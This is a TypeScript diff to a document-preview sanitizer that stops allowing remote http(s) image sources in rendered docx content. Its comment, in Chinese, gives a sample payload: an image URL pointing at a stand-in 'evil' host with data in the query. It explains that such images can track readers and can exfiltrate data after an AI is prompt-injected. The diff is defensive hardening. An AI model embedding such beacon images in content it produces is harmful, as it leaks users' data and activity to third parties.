@@ -103,10 +103,15 @@ const safeHref = (raw: string): string | null => {
   return /^(?:https?:|mailto:)/i.test(v) ? v : null;
 };
 
-/** `<img src>`：只放行 http(s) 与 base64 的 data:image（mammoth 把 docx 内嵌图转成这种） */
+/**
+ * `<img src>`：只放行 base64 的 data:image（mammoth 把 docx 内嵌图转成这种）。
+ * **不放行 http(s) 外链图**：预览一个不可信的 docx 时，文档里的 `<img src="https://evil/p?d=…">` 会在渲染瞬间自动发起请求，
+ * 既泄漏「你打开了这个文件」（读者 IP / 时间），也是 AI 提示注入后的外泄通道（与 AI markdown 里的远程图同一类问题，
+ * 那边已改成点击加载）。mammoth 对 docx 内嵌图一律转 data URI，SheetJS 的 xlsx→HTML 不产出图片，正常文档不受影响；
+ * 只有 docx 里「链接到外部」的图片会被丢掉（`<img>` 保留、src 丢弃）。
+ */
 const safeImgSrc = (raw: string): string | null => {
   const v = stripControl(decodeEntities(raw));
-  if (/^https?:\/\//i.test(v)) return v;
   if (/^data:image\/[a-z0-9.+-]+;base64,[a-z0-9+/=]*$/i.test(v)) return v;
   return null;
 };
